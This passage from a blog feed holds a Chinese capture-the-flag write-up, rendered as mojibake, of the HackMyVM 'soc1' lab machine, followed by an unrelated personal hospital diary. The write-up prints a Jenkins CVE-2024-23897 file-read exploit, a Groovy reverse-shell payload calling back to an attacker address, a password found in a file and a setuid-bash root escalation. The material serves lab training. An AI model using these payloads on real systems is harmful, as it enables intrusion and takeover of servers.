--min-rate=1000<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 18:54 EST<br>Nmap scan report for 192.168.56.181<br>Host is up (0.00074s latency).<br>Not shown: 29994 closed tcp ports (reset)<br>PORT     STATE SERVICE         VERSION<br>22/tcp   open  ssh             OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http            Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).<br>8000/tcp open  http            Splunkd httpd<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Splunkd<br>| http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).<br>|_Requested resource was http://192.168.56.181:8000/en-US/account/login?return_to=%2Fen-US%2F<br>8080/tcp open  http            Jetty 10.0.18<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>| http-open-proxy: Potentially OPEN proxy.<br>|_Methods supported:CONNECTION<br>|_http-title: Dashboard [Jenkins]<br>|_http-server-header: Jetty(10.0.18)<br>8089/tcp open  ssl/http        Splunkd httpd<br>| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser<br>| Not valid before: 2025-10-13T11:00:50<br>|_Not valid after:  2028-10-12T11:00:50<br>|_http-title: splunkd<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Splunkd<br>8191/tcp open  limnerpressure?<br>| fingerprint-strings: <br>|   FourOhFourRequest, GetRequest: <br>|     HTTP/1.0 200 OK<br>|     Connection: close<br>|     Content-Type: text/plain<br>|     Content-Length: 85<br>|_    looks like you are trying to access MongoDB over HTTP on the native driver port.<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8191-TCP:V=7.94SVN%I=7%D=11/5%Time=690BE3C6%P=x86_64-pc-linux-gnu%r<br>SF:(GetRequest,A9,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nConte<br>SF:nt-Type:\x20text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20l<br>SF:ike\x20you\x20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\<br>SF:x20on\x20the\x20native\x20driver\x20port\.\r\n&quot;)%r(FourOhFourRequest,A9<br>SF:,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-Type:\x20te<br>SF:xt/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\x20you\x20<br>SF:are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20on\x20the\x<br>SF:20native\x20driver\x20port\.\r\n&quot;);<br>MAC Address: 08:00:27:A8:61:DC (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8, Linux 5.0 - 5.5<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.74 ms 192.168.56.181<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 60.10 seconds<br><br></code></pre></td></tr></table></figure><p>å¼€æ”¾çš„ç«¯å£æœ‰ç‚¹å¤šï¼Œä¸€ä¸ªä¸€ä¸ªç­›ã€‚</p><p>80ç«¯å£æ˜¯ä¸ªæ¬¢è¿ç•Œé¢ï¼Œæ²¡æœ‰å…¶ä»–çš„ä¸œè¥¿ã€‚</p><p>8000ç«¯å£æ˜¯ç™»å½•ç•Œé¢ï¼Œä¼¼ä¹ç”¨äº†æŸä¸ªcmsï¼ŒåŒæ—¶æœ‰robotsï¼Œä½†æ²¡ä¸œè¥¿ã€‚</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_8R2SzRNwf2.png"></p><p>8080ç«¯å£æ˜¯Jenkinsçš„ç•Œé¢ï¼ŒåŒæ—¶æ³„éœ²äº†ä¸€ä¸ªç”¨æˆ·testï¼Œå¹¶ä¸”å‘ç°ç‰ˆæœ¬å·ä¸º2.441</p><p><img src="/2025/11/06/HackMyvm-soc1/cloudmusic_zaZPoTSgSX.png"></p><p>8191æ˜¯mongodbã€‚</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_J8ABxGDhGX.png"></p><p><a href="https://blog.csdn.net/hcja666/article/details/145358423">CVE-2024-23897-Jenkinsä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°-CSDNåšå®¢</a></p><p>åˆšåˆšçš„Jenkinsæœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar jenkins-cli.jar -s http://192.168.56.181:8080/ -http help 1 &quot;@etc/passwd&quot;<br><br>ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash<br>java -jar jenkins-cli.jar help [COMMAND]<br>Lists all the available commands or a detailed description of single command.<br> COMMAND : Name of the command (default: 1)<br><br></code></pre></td></tr></table></figure><p>ç¡®è®¤å­˜åœ¨æ¼æ´ï¼Œä½†å¥½åƒè¯»çš„ä¸å…¨ã€‚</p><p>æ¢ä¸€æ¡å‘½ä»¤è¯•è¯•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"> java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@etc/passwd&quot; <br><br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent &quot;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&quot; exists.<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin: No such agent &quot;_apt:x:100:65534::/nonexistent:/usr/sbin/nologin&quot; exists.<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin: No such agent &quot;systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin&quot; exists.<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin: No such agent &quot;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&quot; exists.<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin: No such agent &quot;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&quot; exists.<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent &quot;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&quot; exists.<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent &quot;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&quot; exists.<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent &quot;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&quot; exists.<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent &quot;sys:x:3:3:sys:/dev:/usr/sbin/nologin&quot; exists.<br>jenkins:x:1001:1001:,,,:/home/jenkins:/bin/bash: No such agent &quot;jenkins:x:1001:1001:,,,:/home/jenkins:/bin/bash&quot; exists.<br>sync:x:4:65534:sync:/bin:/bin/sync: No such agent &quot;sync:x:4:65534:sync:/bin:/bin/sync&quot; exists.<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent &quot;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&quot; exists.<br>splunk:x:1000:1000:,,,:/home/splunk:/bin/bash: No such agent &quot;splunk:x:1000:1000:,,,:/home/splunk:/bin/bash&quot; exists.<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>root:x:0:0:root:/root:/bin/bash: No such agent &quot;root:x:0:0:root:/root:/bin/bash&quot; exists.<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent &quot;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&quot; exists.<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent &quot;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&quot; exists.<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent &quot;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&quot; exists.<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent &quot;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&quot; exists.<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent &quot;bin:x:2:2:bin:/bin:/usr/sbin/nologin&quot; exists.<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent &quot;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&quot; exists.<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin: No such agent &quot;sshd:x:105:65534::/run/sshd:/usr/sbin/nologin&quot; exists.<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent &quot;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&quot; exists.<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin: No such agent &quot;messagebus:x:104:110::/nonexistent:/usr/sbin/nologin&quot; exists.<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent &quot;games:x:5:60:games:/usr/games:/usr/sbin/nologin&quot; exists.<br><br>ERROR: Error occurred while performing this command, see previous stderr output.<br><br></code></pre></td></tr></table></figure><p>è¿™å°±é½å…¨å¤šäº†ï¼Œç¡®å®šå­˜åœ¨ç”¨æˆ·Jenkinså’Œsplunkã€‚</p><p>è¯»å–user flagã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"> java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@home/splunk/user.txt&quot;<br><br><br>ERROR: No such agent &quot;flag&#123;69cd83075bb1066518625e09aac400711cd31ce7&#125;&quot; exists.<br></code></pre></td></tr></table></figure><h3 id="GetJenkins"><a href="#GetJenkins" class="headerlink" title="GetJenkins"></a>GetJenkins</h3><hr><p>æŸ¥é˜…èµ„æ–™å¾—çŸ¥splunkçš„å¯†ç æ–‡ä»¶å†…å®¹ä½ç½®ã€‚</p><p><a href="https://splunk.my.site.com/customer/s/article/What-to-do-if-a-customer-forgets-the-Admin-password-in-Onprem">Widget</a></p><p><img src="/2025/11/06/HackMyvm-soc1/msedge_7mlCHRzNRQ.png"></p><p>è¯»å–å¯†ç æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ç¤¾è”">java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@opt/splunk/etc/passwd.old&quot;<br><br>test:test1234: No such agent &quot;test:test1234&quot; exists.<br>grep -R &#x27;splunk&#x27;: No such agent &quot;grep -R &#x27;splunk&#x27;&quot; exists.<br>Administrator passwords can be found under the seclists/Passwords folder.: No such agent &quot;Administrator passwords can be found under the seclists/Passwords folder.&quot; exists.<br><br>ERROR: Error occurred while performing this command, see previous stderr output.<br><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªè´¦å¯†ï¼ŒåŒæ—¶å‰é¢å·²ç»çŸ¥é“Jenkinsæœ‰ç”¨æˆ·testï¼Œåˆç†æ€€ç–‘æ˜¯Jenkinsçš„è´¦æˆ·ã€‚</p><p>æˆåŠŸç™»å½•ã€‚</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_waTjICpkYR.png"></p><p><a href="https://blog.csdn.net/benshu_001/article/details/137786384">DevOpsï¼ˆäº”ï¼‰Jenkinså›¾å½¢åŒ–ç•Œé¢ä»‹ç»_jenkins dashboard-CSDNåšå®¢</a></p><p><img src="/2025/11/06/HackMyvm-soc1/msedge_beVOr0i9OJ.png"></p><p>å‘ç°å‘½ä»¤è¡Œç•Œé¢ï¼Œå‡†å¤‡åå¼¹shellã€‚</p><p><img src="/2025/11/06/HackMyvm-soc1/msedge_b2uwyj9K8Q.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">String host=&quot;192.168.56.104&quot;;int port=4444;String cmd=&quot;/bin/bash&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br></code></pre></td></tr></table></figure><p><img src="/2025/11/06/HackMyvm-soc1/vmware_rGyH6zWVJy.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">jenkins@SOC:/$ sudo -l<br>Matching Defaults entries for jenkins on SOC:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jenkins may run the following commands on SOC:<br>    (ALL) NOPASSWD: /opt/splunk/bin/splunk search *<br>    (ALL) NOPASSWD: /opt/splunk/bin/splunk restart<br><br></code></pre></td></tr></table></figure><h3 id="GetSplunk-å¤ç°"><a href="#GetSplunk-å¤ç°" class="headerlink" title="GetSplunk(å¤ç°)"></a>GetSplunk(å¤ç°)</h3><hr><p>é€šè¿‡æŸ¥æ‰¾ç›¸å…³cveå¾—åˆ°ä¸€ä¸ªpoc</p><p><a href="https://github.com/nathan31337/Splunk-RCE-poc">nathan31337&#x2F;Splunk-RCE-poc</a></p><p>åŒæ—¶è¯¥æ¼æ´ç›¸å…³çš„web.conf æ˜¯å¯å†™çš„ã€‚</p><p>ä½†æ˜¯å¾—å…ˆçŸ¥é“splunkçš„å¯†ç ã€‚</p><p>é€šè¿‡çˆ†ç ´ï¼ˆkaliè‡ªå¸¦å­—å…¸ï¼‰å¾—åˆ°splunkçš„è´¦å¯†ä¸ºsplunk:splunk123</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_PvrbcCrVbe.png"></p><p>å…ˆæ”¹å¥½é…ç½®ä¹‹åå†é‡å¯ï¼Œé‡å¯å¾—èŠ±äº›æ—¶é—´è®©webæœåŠ¡è·‘èµ·æ¥ã€‚</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_PHX4QRbrnC.png"></p><p>ç”±äºsplunkå¯å†™ï¼Œç›´æ¥æŠŠç›¸å…³å‘½ä»¤æ›¿æ¢æˆææƒçš„</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">rm</span> /opt/splunk/bin/splunk<br><span class="hljs-built_in">rm</span>: remove write-protected regular file <span class="hljs-string">&#x27;/opt/splunk/bin/splunk&#x27;</span>? <span class="hljs-built_in">yes</span><br>splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chmod +s /bin/bash&quot;</span> &gt; /opt/splunk/bin/splunk<br>splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">chmod</span> +x /opt/splunk/bin/splunk<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">jenkins@SOC:/opt/splunk/etc/system/default$ sudo /opt/splunk/bin/splunk restart<br>jenkins@SOC:/opt/splunk/etc/system/default$ bash -p<br>bash-5.0# id<br>uid=1001(jenkins) gid=1001(jenkins) euid=0(root) egid=0(root) groups=0(root),1001(jenkins)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…¥é™¢å°è®°</title>
    <link href="/2025/11/04/%E5%85%A5%E9%99%A2%E5%B0%8F%E8%AE%B0/"/>
    <url>/2025/11/04/%E5%85%A5%E9%99%A2%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>å…¥é™¢ä¸‰æ˜ŸæœŸæœ‰ä½™ã€‚</p><p>åŒ»é™¢é‡Œï¼Œåšä»€ä¹ˆçš„éƒ½æœ‰ã€‚åŒæˆ¿çš„ç—…å‹ä¸€å·å§“çŸ³ï¼Œå®¶é‡Œå¤§æ¦‚æ˜¯åšæˆ¿åœ°äº§ç”Ÿæ„çš„ï¼Œæ¯æ¬¡åšå®Œæ²»ç–—å›æ¥éƒ½ä¼šçœ‹è§ä»–æ„£æ„£çš„ååœ¨åºŠä¸Šï¼Œä¸çŸ¥é“åœ¨æƒ³ä»€ä¹ˆã€‚åæ¥æˆ‘çŸ¥é“ä»–ä»¥å‰å¾—è¿‡è„‘å‡ºè¡€ï¼Œèµ°è·¯æ€»æœ‰äº›ä¸€ç˜¸ä¸€æ‹ï¼Œæ®ä»–è¯´ï¼Œæœ¬æ¥å¥½äº†ï¼Œä½†æ˜¯è‡ªå·±åœè¯ï¼Œåˆç»™å¼„è¿›æ¥äº†ã€‚åœ¨å‰å‡ å¤©ï¼Œè¿˜æœ‰è¿‡ä¸æƒ³æ´»äº†çš„æƒ³æ³•ï¼Œæ®è¯´æ˜¯å«Œè‡ªå·±è¿™æ¡è…¿æ²¡ç”¨ï¼ŒæŠŠæŠ¤å£«å“å¾—ç›´åŠä»–ï¼Œè¿˜è®©äººæŠŠè€ä¼´å–Šè¿‡æ¥é™ªã€‚ä»–æ€»è¯´ï¼Œè¿™ç—…åªè¦ä¸å»æƒ³ä»–ï¼Œè‡ªç„¶å°±å¥½äº†ï¼Œæˆ‘æ·±ä»¥ä¸ºç„¶ã€‚</p><p>å¦ä¸€ä¸ªç—…å‹å§“è‹—ï¼Œå¹³é¢è®¾è®¡å‡ºèº«ï¼Œæ®ä»–è¯´æˆ‘ä»¬å­¦æ ¡å¥½å¤šå­¦ç”Ÿå®ä¹ éƒ½å»ä»–çš„å…¬å¸åšè¿‡è®¾è®¡ï¼Œä¸çŸ¥æ˜¯çœŸæ˜¯å‡ã€‚</p><p>æ­¤äººæ˜¯ä¸ªå¤©ç”Ÿçš„å¤–å‘æ€§æ ¼ï¼Œä¼¼ä¹ä¸ç®¡åˆ°å“ªéƒ½èƒ½å’Œäººæ‰“æˆä¸€ç‰‡ï¼Œæ®è¯´è¿˜é™ªç€é¢†å¯¼å»äº†å‡ æ¬¡å¸‚é‡Œçš„ä¼šæ‰€ï¼Œæ¯æ¬¡çœ‹ä»–è°ˆå¤©è¯´åœ°çš„æ ·ï¼Œå¿ƒé‡Œå°±ä¼šæƒ³ï¼Œæ€ä¹ˆä»–è¿™æ ·çš„äººä¹Ÿè½åˆ°äº†å’Œæˆ‘ä¸€èµ·ï¼Ÿåé¢å¬ä»–è¯´ï¼Œæ˜¯åƒé¥­å‡ºäº†é—®é¢˜ï¼Œæœ›ç€ç¢—ç­·å°±ä¼šç„¦è™‘ï¼Œæœ€åæ•´çš„åªèƒ½åƒæµé£Ÿç»­å‘½ã€‚ä¸è¿‡åŒ»é™¢20å…ƒçš„å¤§é”…é¥­ï¼Œä»–ç…§æ ·åƒçš„çˆ½å¿«ï¼Œå¤§é”…é¥­ä»€ä¹ˆéƒ½æœ‰ï¼Œåˆšå…¥é™¢çš„é‚£ä¸€é¤è±†èŠ½ç²‰ä¸é‡Œé¢ç”šè‡³æœ‰äº›è®¸å¾®é‡è›‹ç™½è´¨ï¼Œæˆ‘ä¹Ÿåªèƒ½æ‘‡æ‘‡å¤´æŒ‘å‡ºæ¥æ‰”æ‰ã€‚åœ¨ä½é™¢æ—¶ï¼Œå¤§å®¶æ€»ä¼šæ‰¯é—²ç¯‡ï¼Œè€Œä»–æ€»ä¼šç¬¬ä¸€ä¸ªå¼€å¯è¯é¢˜ï¼Œä»–çš„ç¬‘å£°å¾ˆç‹¬ç‰¹ï¼Œæœ‰ç‚¹åƒé¹…ï¼Œå’•å˜å’•å˜ï¼ŒåŠ ä¸Šç•™ç€åˆ†å¤´ï¼Œä¿¨ç„¶ä¸€å‰¯æ´»æ³¼ç§‘å‘˜çš„æ¨¡æ ·ï¼Œè®²è¯æ€»æ˜¯æ“ä»–å¥¶å¥¶èµ·æ‰‹ï¼Œä¼¼ä¹å…¨å¤©ä¸‹çš„å¥¶å¥¶éƒ½è¢«ä»–ä¸€äººæ“éäº†ã€‚</p><p>é™¤äº†æˆ‘ï¼Œè¿˜æœ‰å…ˆåæœ‰ä¸¤ä½é«˜ä¸­ç”Ÿæ¬è¿›æ¥ã€‚æ¬è¿›æ¥æ—¶ï¼Œè€çŸ³å’Œè€è‹—éƒ½è¯´å¹´è½»äººï¼Œè¿™ç—…ä¸ç¢äº‹ï¼Œæ¢å¤çš„å¿«ï¼Œä¸çŸ¥é“æˆ‘ç®—ä¸ç®—å¹´è½»äººã€‚è¿™ä¸¤ä½æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚åŒ»é™¢é‡Œæ®ä¼ è¿˜æœ‰äººä¿¡è€¶ç¨£ï¼Œå…¥é™¢çš„æ—¶å€™åŒ»ç”Ÿä¹Ÿé—®è¿‡æˆ‘ä¿¡ä¸ä¿¡æ•™ï¼Œæˆ‘æ˜¯ä¸ä¿¡ä»€ä¹ˆçš„ï¼Œè½®å›è½¬ä¸–ä¹‹ç±»çš„è¯´æ³•å¯¹æˆ‘ä¹Ÿæ²¡å¸å¼•åŠ›ã€‚æˆ‘è®¤ä¸ºæ­»ååªæœ‰è™šæ— ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å”¯ä¸€èƒ½æ¥å—çš„æ­»åä¸–ç•Œè§‚ç‚¹ï¼Œå…¶ä»–è§‚ç‚¹éƒ½æœ‰äº›æ— èŠäº†ï¼Œåªæœ‰æ°¸æ’çš„æ°¸æ’è™šæ— æ‰æ˜¾å¾—ä¸é‚£ä¹ˆæ— èŠï¼Œæˆ–è€…ï¼Œæœ‰é‚£ä¹ˆä¸€ç‚¹å¹³é™ï¼Œæ‰€ä»¥åŒ»ç”Ÿé—®æˆ‘æ€•æ­»å’Œæœ‰æ¡ä»¶æ˜¯å¦ä¼šæ¥å—æ­»äº¡çš„é—®é¢˜æ—¶ï¼Œæˆ‘éƒ½åªæ˜¯æ‘‡æ‘‡å¤´ï¼Œè¯´æˆ‘ä¸çŸ¥é“ã€‚æˆ‘ç¡®å®ä¸çŸ¥é“ï¼Œå¿…é¡»è¦æŠŠæˆ‘æ”¾åœ¨é‚£ä¸ªæƒ…å¢ƒä¸­ï¼Œæˆ‘æ‰ä¼šçŸ¥é“æ€ä¹ˆåšã€‚</p><p>åŒ»é™¢é‡Œæ²¡æœ‰ç½‘ï¼Œé™¤å»ç”¨æ‰‹æœºåˆ·æµé‡ä¹‹å¤–ï¼Œå‰©ä¸‹çš„æ—¶å…‰åªæœ‰å»4æ¥¼åšç‰¹æ®Šæ²»ç–—ç®—æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œå…¶ä½™çš„æ—¶å…‰å¤§éƒ½åœ¨ç­‰å¾…ç†ç–—å’Œç¡è§‰ä¸­åº¦è¿‡ã€‚åœ¨åŒ»é™¢æˆ‘åšçš„æœ€å¤šçš„äº‹å°±æ˜¯ç­‰å¾…ï¼Œæˆ‘ä¸çŸ¥é“æˆ‘æ˜¯ä¸æ˜¯å­¦ä¼šäº†ç­‰å¾…ï¼Œåªæ˜¯æ¯å¤©æ„Ÿè§‰å¯ä»¥å¿å—çš„æ—¶é—´å¤šäº†ä¸€äº›ï¼Œåç€çœ‹ç€æ²»ç–—ç»“æŸçš„æ—¶é—´å˜å¿«äº†äº›ã€‚</p><p>4æ¥¼çš„ç‰¹æ®Šæ²»ç–—æœ‰kæ­Œæˆ¿ï¼Œå¤§å®¶æ€»æ˜¯ç‚¹ä¸€äº›ç»å…¸çš„æ ¡å›­æ­Œæ›²ï¼Œæˆ–è€…å…«ä¹åå¹´ä»£ï¼Œé›¶é›¶å¹´ä»£çš„æµè¡Œä¹ï¼Œè¿™å¤§æ¦‚ä¹Ÿå’Œå…¥é™¢æ‚£è€…çš„å¹´é¾„æœ‰å…³ï¼Œå¤§éƒ½åœ¨ä¸‰åå²å¾€ä¸Šã€‚æ˜¨å¤©æŠ¤å£«è¯´ï¼Œæˆ‘æ€»æ˜¯ç‚¹æ°‘è°£ï¼Œæˆ‘æ²¡æƒ³åˆ°å¥¹è¿˜ä¼šç•™æ„è¿™ä¸€ç‚¹ã€‚æ°‘è°£æˆ‘è®¤ä¸ºæ˜¯æ‰€æœ‰äººéƒ½é€‚åˆå¬çš„ï¼Œä¸ç®¡ä»€ä¹ˆå¹´é¾„éƒ½èƒ½å¬å‡ºä¸€ç‚¹å‘³é“åœ¨é‡Œé¢ã€‚è¯´æ˜¯æ°‘è°£ï¼Œå…¶å®ä¹Ÿå°±æ˜¯é‚£å‡ é¦–æ­Œï¼Œã€Šå—å±±å—ã€‹ã€Šæˆéƒ½ã€‹ã€Šç¨‹è‰¾å½±ã€‹ï¼Œåˆšå»çš„æ—¶å€™è¿˜ç‚¹äº†ã€Šç‚‰å¿ƒèè§£ã€‹ï¼Œä¸è¿‡æˆ‘å‘ç°æ²¡æœ‰å‡åæ³¨éŸ³ï¼Œåªèƒ½è·Ÿç€çå”±ã€‚ç‚¹æ¥ç‚¹å»ï¼Œç‚¹çš„æœ€å¤šçš„è¿˜æ˜¯ã€Šç¨‹è‰¾å½±ã€‹ï¼Œä¸€è·¯æœ›ï¼Œè·Œè·Œæ’ï¼Œåˆå¤œæµæ˜Ÿä½•å»ä½•å¾€ï¼Œè·¯æµ·é•¿ï¼Œé’å¤œæ—·ï¼Œè¶Šè¿‡ç¾¤å±±è¿½æ–œé˜³ã€‚ä¸çŸ¥ä¸ºä»€ä¹ˆï¼Œæˆ‘è§‰å¾—å®ƒçš„æ­Œè¯å”±èµ·æ¥ç‰¹åˆ«å¥½å¬ï¼Œæ˜¯å’Œåˆ«çš„æ°‘è°£ä¸ä¸€æ ·çš„å¥½å¬ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>ç”Ÿæ´»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnyx-debugå¤ç›˜</title>
    <link href="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/"/>
    <url>/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/</url>
    
